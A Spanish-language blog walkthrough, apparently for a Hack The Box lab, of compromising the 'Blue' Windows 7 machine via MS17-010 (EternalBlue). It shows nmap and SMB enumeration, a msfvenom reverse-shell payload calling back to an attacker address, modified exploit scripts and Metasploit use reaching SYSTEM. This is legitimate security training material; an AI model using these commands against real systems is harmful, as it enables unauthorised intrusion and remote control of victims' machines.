@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="es">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link rel="stylesheet" type="text/css" href="/theme/css/elegant.prod.9e9d5ce754.css" media="screen">
+        <link rel="stylesheet" type="text/css" href="/theme/css/custom.css" media="screen">
+
+
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+
+
+        <link rel="dns-prefetch" href="//fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
+
+        <meta name="author" content="Alexis Imhoff" />
+
+        <meta property="og:type" content="article" />
+        <meta name="twitter:card" content="summary">
+
+<meta name="keywords" content="CTF, offensive, HTB, " />
+
+<meta property="og:title" content="Resolución de máquina Blue "/>
+<meta property="og:url" content="/htb-blue.html" />
+<meta property="og:description" content="Enumeración Escaneo de puertos: nmap -p- --open --min-rate 5000 -vvv -sS 10.10.10.40 Completed SYN Stealth Scan at 20:25, 17.75s elapsed (65535 total ports) Nmap scan report for 10.10.10.40 Host is up, received echo-reply ttl 127 (0.26s latency). Scanned at 2024-05-24 20 …" />
+<meta property="og:site_name" content="alimh blog" />
+<meta property="og:article:author" content="Alexis Imhoff" />
+<meta property="og:article:published_time" content="2024-10-20T00:00:00-03:00" />
+<meta name="twitter:title" content="Resolución de máquina Blue ">
+<meta name="twitter:description" content="Enumeración Escaneo de puertos: nmap -p- --open --min-rate 5000 -vvv -sS 10.10.10.40 Completed SYN Stealth Scan at 20:25, 17.75s elapsed (65535 total ports) Nmap scan report for 10.10.10.40 Host is up, received echo-reply ttl 127 (0.26s latency). Scanned at 2024-05-24 20 …">
+
+        <title>Resolución de máquina Blue  · alimh blog
+</title>
+
+
+
+    </head>
+    <body>
+        <div id="content">
+            <div class="navbar navbar-static-top">
+                <div class="navbar-inner">
+                    <div class="container-fluid">
+                        <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+                            <span class="icon-bar"></span>
+                            <span class="icon-bar"></span>
+                            <span class="icon-bar"></span>
+                        </a>
+                        <a class="brand" href="/"><span class=site-name>alimh blog</span></a>
+                        <div class="nav-collapse collapse">
+                            <ul class="nav pull-right top-menu">
+                                <li >
+                                    <a href=
+                                       "/"
+                                    >Home</a>
+                                </li>
+                                <li ><a href="/categories.html">Categories</a></li>
+                                <li ><a href="/tags.html">Tags</a></li>
+                                <li ><a href="/archives.html">Archives</a></li>
+                                <li><form class="navbar-search" action="/search.html" onsubmit="return validateForm(this.elements['q'].value);"> <input type="text" class="search-query" placeholder="Search" name="q" id="tipue_search_input"></form></li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="container-fluid">
+              <div class="row-fluid">
+                <div class="span2"> 
+<aside id="sidebar">
+    <div class="about-me">
+        <img src="/images/avatar.webp" alt="Mi Foto" class="avatar">
+        <p>Hola! Soy Alexis Imhoff. Ingeniero en informática apasionado por la ciberseguridad. En este blog subiré writeups de CTFs y algun que otro tema relacionado a seguridad.</p>
+        <ul class="social-links">
+            <li>
+                <a href="https://www.linkedin.com/in/alexis-imhoff/" target="_blank" rel="noopener noreferrer">
+                    <i class="fab fa-linkedin"></i>
+                    <!-- Linkedin -->
+              </a>
+            </li>
+        </ul>
+    </div>
+</aside>
+                </div>
+              <div class="span10">
+<article itemscope>
+<div class="row-fluid">
+    <header class="page-header span10 offset1">
+        <h1>
+            <a href="/htb-blue.html">
+                Resolución de máquina Blue
+            </a>
+        </h1>
+    </header>
+</div>
+
+<div class="row-fluid">
+        <div class="span8 offset1 article-content">
+            
+            <p><img alt="machine" src="images/images_htb_blue/blue_logo.jpg"></p>
+<h1>Enumeración</h1>
+<p>Escaneo de puertos:</p>
+<div class="highlight"><pre><span></span><code>nmap -p- --open --min-rate 5000 -vvv -sS 10.10.10.40
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code>Completed SYN Stealth Scan at 20:25, 17.75s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.40
+Host is up, received echo-reply ttl 127 (0.26s latency).
+Scanned at 2024-05-24 20:25:01 -03 for 18s
+Not shown: 65460 closed tcp ports (reset), 66 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE      REASON
+135/tcp   open  msrpc        syn-ack ttl 127
+139/tcp   open  netbios-ssn  syn-ack ttl 127
+445/tcp   open  microsoft-ds syn-ack ttl 127
+49152/tcp open  unknown      syn-ack ttl 127
+49153/tcp open  unknown      syn-ack ttl 127
+49154/tcp open  unknown      syn-ack ttl 127
+49155/tcp open  unknown      syn-ack ttl 127
+49156/tcp open  unknown      syn-ack ttl 127
+49157/tcp open  unknown      syn-ack ttl 127
+</code></pre></div>
+
+<p>Detectamos versión y servicio de los puertos abiertos:</p>
+<div class="highlight"><pre><span></span><code>nmap -sCV -p135,139,445,49152,49153,49154,49155,49156,49157 10.10.10.40
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code>Nmap scan report for 10.10.10.40
+Host is up (0.28s latency).
+
+PORT      STATE SERVICE      VERSION
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49155/tcp open  msrpc        Microsoft Windows RPC
+49156/tcp open  msrpc        Microsoft Windows RPC
+49157/tcp open  msrpc        Microsoft Windows RPC
+Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb-os-discovery: 
+|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+|   Computer name: haris-PC
+|   NetBIOS computer name: HARIS-PC\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2024-05-25T00:30:09+01:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_clock-skew: mean: -19m57s, deviation: 34m35s, median: 0s
+| smb2-security-mode: 
+|   2:1:0: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2024-05-24T23:30:06
+|_  start_date: 2024-05-24T20:52:34
+</code></pre></div>
+
+<h3>Servicio SMB</h3>
+<p>Nos conectamos al puerto 445 a través de <strong>smbmap</strong> utilizando una NULL session. Vemos que tenemos permisos de READ ONLY sobre dos recursos. Intentamos listar el contenido con <strong>smbclient</strong>, pero no vemos nada relevante:</p>
+<div class="highlight"><pre><span></span><code>smbmap -H <span class="m">10</span>.10.10.40 -u <span class="s1">&#39;null&#39;</span>
+smbclient //10.10.10.40/Users -N
+</code></pre></div>
+
+<p><img alt="blue" src="images/images_htb_blue/htb_blue-1.jpg"></p>
+<p>Realizaremos una búsqueda de vulnerabilidas utilizando los scripts de nmap:</p>
+<div class="highlight"><pre><span></span><code>nmap --script &#39;vuln and safe&#39; -p445 10.10.10.40 
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code>Nmap scan report for 10.10.10.40
+Host is up (0.34s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+</code></pre></div>
+
+<p>Es vulnerable a MS17-010, una vulnerabilidad en el protocolo SMBv1, por lo que podemos utilizar el conocido exploit EternalBlue. </p>
+<h1>Explotación manual</h1>
+<p>Nos vamos a clonar el siguiente repositorio: https://github.com/worawit/MS17-010 </p>
+<p>Inicialmente, usaremos el script <em>checker.py</em> para validar nuevamente si es vulnerable. Es importante tener en cuenta que es un script antiguo y está desarrollado en python2. Al principio, tenemos el siguiente error:</p>
+<p><img alt="blue" src="images/images_htb_blue/htb_blue-2.jpg"></p>
+<p>Para resolver esto, vamos a modificar el script y especificar el usuario <strong>guest</strong>:</p>
+<p><img alt="blue" src="images/images_htb_blue/htb_blue-3.jpg"></p>
+<p>Lo corremos nuevamente y ahora si vemos el status de los <strong>named pipes</strong>. Estos juegan un papel importante porque SMB permite acceder y manejar named pipes como parte de sus funcionalidades. El exploit utiliza named pipes específicos para realizar operaciones posteriores a la explotación inicial, por lo tanto, si tenemos un OK en alguno de los listados, tenemos una vía potencial de ejecutar comandos en el sistema.</p>
+<p><img alt="blue" src="images/images_htb_blue/htb_blue-4.jpg"></p>
+<p>Antes de continuar, generaremos un payload con msfvenom:</p>
+<div class="highlight"><pre><span></span><code>msfvenom -p windows/shell_reverse_tcp -f exe <span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.10.14.102 <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span> -o eternal-blue.exe
+</code></pre></div>
+
+<p>Ahora, modificaremos el contenido del exploit <em>zzz_exploit.py</em>. Por un lado, especificaremos nuevamente el usuario <strong>guest</strong>, y por otro, modificaremos las siguientes líneas: </p>
+<p><img alt="blue" src="images/images_htb_blue/htb_blue-5.jpg"></p>
+<p>A priori, crea un archivo <em>pwned.txt</em> pero esto no nos interesa. Tras estos cambios, lo que hará será enviar nuestro payload a la máquina víctima, lo guardará en el disco C: y luego lo ejecutará. </p>
+<p>Antes de correr el exploit, nos ponemos a la escucha en el puerto 443, que es el que especificamos como LPORT. </p>
+<p>Luego, lo ejecutamos de la siguiente manera. En este caso, especificamos el name piped <em>lsarpc</em>: </p>
+<div class="highlight"><pre><span></span><code>pyhon2 zzz.exploit.py <span class="m">10</span>.10.10.40 lsarpc
+</code></pre></div>
+
+<p><img alt="blue" src="images/images_htb_blue/htb_blue-6.jpg"></p>
+<p>Recibimos la Reverse Shell: </p>
+<p><img alt="blue" src="images/images_htb_blue/htb_blue-7.jpg"></p>
+<h1>Explotación a través de MSF</h1>
+<p>Con Metasploit, podemos utlizar el módulo <strong>windows/smb/ms17_010_eternalblue</strong>. Obtendremos una sesión de <em>Meterpreter</em> como <em>NT AUTHORITY\SYSTEM</em>:</p>
+<p><img alt="blue" src="images/images_htb_blue/htb_blue-8.jpg"></p>
+<p>Como tenemos los máximos privilegios, podemos leer ambas flags: </p>
+<p><img alt="blue" src="images/images_htb_blue/htb_blue-9.jpg"></p>
+
+
+             
+ 
+            
+            
+            
+
+
+
+
+
+
+
+            <hr/>
+        </div>
+        <section id="article-sidebar" class="span2">
+            <h4>Published</h4>
+            <time itemprop="dateCreated" datetime="2024-10-20T00:00:00-03:00">dom 20 octubre 2024</time>
+            <h4>Category</h4>
+            <a class="category-link" href="/categories.html#htb-ref">HTB</a>
+            <h4>Tags</h4>
+            <ul class="list-of-tags tags-in-article">
+                <li><a href="/tags.html#ctf-ref">CTF
+                    <span class="superscript">9</span>
+</a></li>
+                <li><a href="/tags.html#offensive-ref">offensive
+                    <span class="superscript">11</span>
+</a></li>
+            </ul>
+            
+
+
+
+
+
+            
+
+
+
+
+
+        </section>
+</div>
+</article>
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe.
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides.
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo https://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>              </div>
+            </div>
+        </div>
+<footer>
+
+
+
+
+    <div id="fpowered">
+        Powered by: <a href="http://getpelican.com/" title="Pelican Home Page" target="_blank" rel="nofollow noopener noreferrer">Pelican</a>
+        Theme: <a href="https://elegant.oncrashreboot.com/" title="Theme Elegant Home Page" target="_blank" rel="nofollow noopener noreferrer">Elegant</a>
+    </div>
+</footer>            <script src="//code.jquery.com/jquery.min.js"></script>
+        <script src="//netdna.bootstrapcdn.com/twitter-bootstrap/2.3.2/js/bootstrap.min.js"></script>
+        <script src="/theme/js/elegant.prod.9e9d5ce754.js"></script>
+        <script>
+            function validateForm(query)
+            {
+                return (query.length > 0);
+            }
+        </script>
+
+    <script>
+    (function () {
+        if (window.location.hash.match(/^#comment-\d+$/)) {
+            $('#comment_thread').collapse('show');
+        }
+    })();
+    window.onhashchange=function(){
+        if (window.location.hash.match(/^#comment-\d+$/))
+            window.location.reload(true);
+    }
+    $('#comment_thread').on('shown', function () {
+        var link = document.getElementById('comment-accordion-toggle');
+        var old_innerHTML = link.innerHTML;
+        $(link).fadeOut(200, function() {
+            $(this).text('Click here to hide comments').fadeIn(200);
+        });
+        $('#comment_thread').on('hidden', function () {
+            $(link).fadeOut(200, function() {
+                $(this).text(old_innerHTML).fadeIn(200);
+            });
+        })
+    })
+</script>
+
+    </body>
+    <!-- Theme: Elegant built for Pelican
+        License : MIT -->
+</html>
